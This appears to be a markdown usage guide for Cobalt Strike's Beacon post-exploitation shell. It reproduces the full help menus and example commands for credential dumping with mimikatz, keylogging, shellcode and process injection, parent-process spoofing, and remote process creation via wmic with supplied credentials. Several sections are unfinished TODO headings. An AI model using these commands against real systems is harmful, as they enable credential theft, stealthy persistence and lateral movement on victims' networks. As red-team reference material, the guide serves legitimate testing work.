# Usage

## 01 - Shell Handler

TODO: Finish the missing basic information with screenshots

### 1.1 - HTTP

### 1.2 - HTTPS

### 1.3 - SMB

### 1.4 - TCP

## 02 - Credentials Database

TODO: Finish the missing basic information with screenshots

### 2.1 - Add Credentials Manually

## 03 - Interactive Shell

### 3.1 - Beacons

### 3.1.1 - Help Menu

```
beacon> help

Beacon Commands
===============

    Command                   Description
    -------                   -----------
    argue                     Spoof arguments for matching processes
    blockdlls                 Block non-Microsoft DLLs in child processes
    browserpivot              Setup a browser pivot session
    cancel                    Cancel a download that's in-progress
    cd                        Change directory on host. Use '-' to get back to previous cwd.
    checkin                   Call home and post data
    chromedump                Recover credentials from Google Chrome
    clear                     Clear beacon queue
    connect                   Connect to a Beacon peer over TCP
    covertvpn                 Deploy Covert VPN client
    cp                        Copy a file
    dcsync                    Extract a password hash from a DC
    desktop                   View and interact with target's desktop
    dllinject                 Inject a Reflective DLL into a process
    dllload                   Load DLL into a process with LoadLibrary()
    download                  Download a file
    downloads                 Lists file downloads in progress
    drives                    List drives on target
    elevate                   Spawn a session in an elevated context
    execute                   Execute a program on target (no output)
    execute-assembly          Execute a local .NET program in-memory on target
    exit                      Terminate the beacon session
    getprivs                  Enable system privileges on current token
    getsystem                 Attempt to get SYSTEM
    getuid                    Get User ID
    hashdump                  Dump password hashes
    help                      Help menu
    inject                    Spawn a session in a specific process
    inline-execute            Run a Beacon Object File in this session
    jobkill                   Kill a long-running post-exploitation task
    jobs                      List long-running post-exploitation tasks
    jump                      Spawn a session on a remote host
    kerberos_ccache_use       Apply kerberos ticket from cache to this session
    kerberos_ticket_purge     Purge kerberos tickets from this session
    kerberos_ticket_use       Apply kerberos ticket to this session
    keylogger                 Start a keystroke logger
    kill                      Kill a process
    link                      Connect to a Beacon peer over a named pipe
    logonpasswords            Dump credentials and hashes with mimikatz
    ls                        List files
    make_token                Create a token to pass credentials
    mimikatz                  Runs a mimikatz command
    mkdir                     Make a directory
    mode dns                  Use DNS A as data channel (DNS beacon only)
    mode dns-txt              Use DNS TXT as data channel (DNS beacon only)
    mode dns6                 Use DNS AAAA as data channel (DNS beacon only)
    mv                        Move a file
    net                       Network and host enumeration tool
    note                      Assign a note to this Beacon
    portscan                  Scan a network for open services
    powerpick                 Execute a command via Unmanaged PowerShell
    powershell                Execute a command via powershell.exe
    powershell-import         Import a powershell script
    ppid                      Set parent PID for spawned post-ex jobs
    printscreen               Take a single screenshot via PrintScr method
    ps                        Show process list
    psinject                  Execute PowerShell command in specific process
    pth                       Pass-the-hash using Mimikatz
    pwd                       Print current directory
    reg                       Query the registry
    remote-exec               Run a command on a remote host
    rev2self                  Revert to original token
    rm                        Remove a file or folder
    rportfwd                  Setup a reverse port forward
    rportfwd_local            Setup a reverse port forward via Cobalt Strike client
    run                       Execute a program on target (returns output)
    runas                     Execute a program as another user
    runasadmin                Execute a program in an elevated context
    runu                      Execute a program under another PID
    screenshot                Take a single screenshot
    screenwatch               Take periodic screenshots of desktop
    setenv                    Set an environment variable
    shell                     Execute a command via cmd.exe
    shinject                  Inject shellcode into a process
    shspawn                   Spawn process and inject shellcode into it
    sleep                     Set beacon sleep time
    socks                     Start SOCKS4a server to relay traffic
    socks stop                Stop SOCKS4a server
    spawn                     Spawn a session 
    spawnas                   Spawn a session as another user
    spawnto                   Set executable to spawn processes into
    spawnu                    Spawn a session under another process
    spunnel                   Spawn and tunnel an agent via rportfwd
    spunnel_local             Spawn and tunnel an agent via Cobalt Strike client rportfwd
    ssh                       Use SSH to spawn an SSH session on a host
    ssh-key                   Use SSH to spawn an SSH session on a host
    steal_token               Steal access token from a process
    timestomp                 Apply timestamps from one file to another
    unlink                    Disconnect from parent Beacon
    upload                    Upload a file to specified remote location.
```

### 3.1.2 - Basic Commands

#### 3.1.2.1 - Navigation

`beacon> cd <directory>`

#### 3.1.2.2 - Sleep and Jitter

* Set the sleep time for executing beacon commands with delay. If `sleep` is `0` it becomes interactive mode.

`beacon> sleep <seconds> <jitter>`

`beacon> sleep 30 15`

#### 3.1.2.2 - List files or directories

`beacon> ls`

#### 3.1.2.3 - Execute Shell Commands

* Execute any `shell` command that the beacon spawns a process `cmd.exe`

`beacon> shell <command> [args]`

`beacon> shell dir /s /b c:\ | findstr "explorer.exe"`

* Spawns a `cmd.exe` process but doesn't print the output

`beacon> execute <command> [args]`

* Spawns a child process of `powershell.exe`

`beacon> powershell <cmdlet> [args]`

* Executes unmanaged powershell command. Make sure to change the process when using the `spawnto` command

`beacon> powerpick <cmdlet> [args]`

#### 3.1.2.4 - Execute Program

Execute commands without spawning `cmd.exe` except the running process comes from the beacon. This is highly recommended when you perform post exploitation activities.

`beacon> run <command> [args]`

`beacon> run arp -a`

`beacon> run wmic.exe /node:<IP> /user:<username> /password:<password> win32_process call create "C:\path\to\shell.exe"`

Run .NET binary through a temporary process when running `spawnto` beacon command otherwise it defaults back to `rundll32.dll`

`beacon> execute-assembly /path/to/compiled_dotnet_tool.exe [args]`

#### 3.1.2.5 - Upload and Download Files

* Upload file

`beacon> upload /path/to/file.txt C:\path\to\upload_file.txt`

* Download file

`beacon> download C:\path\to\download_file.txt`

* Check file downloads

`beacon> downloads`

* Cancel file download(s)

`beacon> cancel <file | *>`

#### 3.1.2.6 - Jobs Queue

* Queue jobs

`beacon> jobs`

* Kill job ID

`beacon> jobkill <jid>`

### 3.1.3 - Process Manipulation

#### 3.1.3.1 - Inject Process

* Inject to spawn beacon session

`beacon> inject <pid> <architecture> <listener>`

* Run powershell through another process

`beacon> psinject <pid> <arch> <cmdlet> [args]`

#### 3.1.3.2 - Inject Shellcode

* Inject shellcode

`beacon> shinject <pid> /path/to/shellcode.bin`

* Spawn shellcode and tunnel

`beacon> spunnel <pid> /path/to/shellcode.bin`

#### 3.1.3.3 - Spoof Process

* Spoof a parent process that is ready to spawn a new child process

`beacon> ppid <ppid>`

#### 3.1.3.4 - Spawn Beacon Session

`beacon> spawnas <username> <password>`

`beacon> spawnto <arch> <path> <args>`

`beacon> spawnto x86 c:\program files (x86)\internet explorer\iexplore.exe`

`beacon> spawnto x86 C:\Program Files (x86)\Common Files\Java\Java Update\jucheck.exe`

`beacon> spawn <arch> <listener>`

### 3.1.4 - Spoof Arguments

`beacon> argue <command> [args]`

### 3.2 - SSH

### 3.2.1 - Help Menu

```
ssh> help

SSH Commands
============

    Command                   Description
    -------                   -----------
    cancel                    Cancel a download that's in-progress
    cd                        Change directory
    clear                     Clear task queue
    connect                   Connect to a Beacon peer over TCP
    download                  Download a file
    downloads                 Lists file downloads in progress
    exit                      Terminate this session
    help                      Help menu
    note                      Assign a note to this session
    pwd                       Print current directory
    rportfwd                  Setup a reverse port forward
    rportfwd_local            Setup a reverse port forward via Cobalt Strike client
    shell                     Execute a command via the shell
    sleep                     Set parent beacon's sleep time
    socks                     Start SOCKS4a server to relay traffic
    socks stop                Stop SOCKS4a server
    sudo                      Run a command via sudo
    unlink                    Disconnect a child TCP Beacon session
    upload                    Upload a file
```

### 3.2.2 - Basic Commands

#### 3.2.2.1 - Execute Shell Commands

`ssh> shell <command> [args]`

## 04 - Shortcut Keys

* **Clear the beacon screen console**

CTRL+K

## References

* [Cobalt Strike Spawn Tunnel](https://rastamouse.me/cobalt-strike-spawn-tunnel/)

* [Helpsystems.com Documentation](https://hstechdocs.helpsystems.com)

* [Beacon Commands](https://www.aldeid.com/wiki/Cobalt-Strike/Beacon-Commands)

* [Cobalt Arsenal](https://github.com/mgeeky/cobalt-arsenal)

* [https://www.youtube.com/watch?v=Pb6yvcB2aYw](https://www.youtube.com/watch?v=Pb6yvcB2aYw)

* [Cobalt Strike Shortcut Keys](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/ui_kbd-shortcuts.htm)